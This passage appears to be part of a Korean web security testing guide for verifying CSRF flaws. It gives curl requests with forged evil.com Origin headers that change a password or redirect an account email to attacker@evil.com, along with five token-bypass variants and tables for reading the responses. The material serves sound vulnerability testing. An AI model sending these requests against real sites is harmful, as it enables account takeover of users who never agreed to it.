### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. 대상 엔드포인트의 정상 요청을 캡처 (쿠키, 파라미터 확인)
2. curl로 외부 Origin에서 온 것처럼 요청을 전송:
   - CSRF 토큰 제거
   - `Origin` 헤더를 외부 도메인으로 설정
   - `Referer` 헤더를 외부 도메인으로 설정
3. 요청이 정상 처리되는지 확인 (200 OK, 상태 변경 발생)

**curl 예시:**
```
curl -X POST "https://target.com/api/change-password" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com" \
  -H "Referer: https://evil.com/attack.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "new_password=hacked123"
```

**SameSite 쿠키 확인:**
```
# Set-Cookie 헤더에서 SameSite 속성 확인
curl -v "https://target.com/auth/login" 2>&1 | grep -i "set-cookie"
```

| SameSite 값 | CSRF 가능성 |
|-------------|------------|
| `SameSite=None; Secure` | CSRF 가능 — 크로스사이트 요청에 쿠키 전송 |
| SameSite 속성 없음 | 브라우저 기본값(`Lax`) 적용 — GET만 전송, POST는 차단 |
| `SameSite=Lax` | GET 요청으로 상태 변경하는 엔드포인트만 취약 |
| `SameSite=Strict` | CSRF 불가 — 쿠키가 크로스사이트에서 전송되지 않음 |

**CSRF 토큰 우회 테스트:**
```
# 1. 토큰 제거
curl -X POST "https://target.com/api/change-email" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com" \
  -d "email=attacker@evil.com"

# 2. 토큰 빈 문자열
curl -X POST "https://target.com/api/change-email" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com" \
  -d "email=attacker@evil.com&csrf_token="

# 3. 다른 사용자의 토큰 (토큰이 세션에 바인딩되지 않은 경우)
curl -X POST "https://target.com/api/change-email" \
  -H "Cookie: session=USER_A_SESSION" \
  -H "Origin: https://evil.com" \
  -d "email=attacker@evil.com&csrf_token=USER_B_TOKEN"

# 4. HTTP 메서드 변경 (POST → GET, CSRF 체크 우회)
curl "https://target.com/api/change-email?email=attacker@evil.com" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com"

# 5. Content-Type 변경 (JSON → form, CSRF 미들웨어 우회)
curl -X POST "https://target.com/api/change-email" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}'
```

**CORS 사전 요청과 CSRF 관계:**
```
# CORS preflight 없이 전송 가능한 조건 확인
# (simple request: GET/POST/HEAD + 제한된 Content-Type + 커스텀 헤더 없음)
# JSON API가 Content-Type: application/json을 요구하면 preflight 발생 → CSRF 어려움
# 단, Content-Type 없이도 요청이 처리되는지 확인:
curl -X POST "https://target.com/api/change-email" \
  -H "Cookie: session=USER_SESSION_COOKIE" \
  -H "Origin: https://evil.com" \
  -d '{"email":"attacker@evil.com"}'
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 200 OK + 상태 변경 확인 (토큰 없이) | 확인됨 |
| 200 OK + 상태 변경 확인 (외부 Origin) | 확인됨 |
| 403 + `CSRF token missing` / `invalid token` | 안전 (CSRF 토큰 검증 동작) |
| 403 + `invalid origin` / CORS 에러 | 안전 (Origin 검증 동작) |
| 401 Unauthorized (Bearer 토큰 인증) | 해당 없음 (쿠키 미사용 → CSRF 면역) |
| 200 OK 이지만 상태 변경 없음 (read-only 동작) | 안전 (상태 변경 API가 아님) |

**검증 기준:**
- **확인됨**: 동적 테스트로 CSRF 토큰 없이 외부 Origin에서 보낸 요청이 정상 처리되어 상태가 변경된 것을 직접 확인함
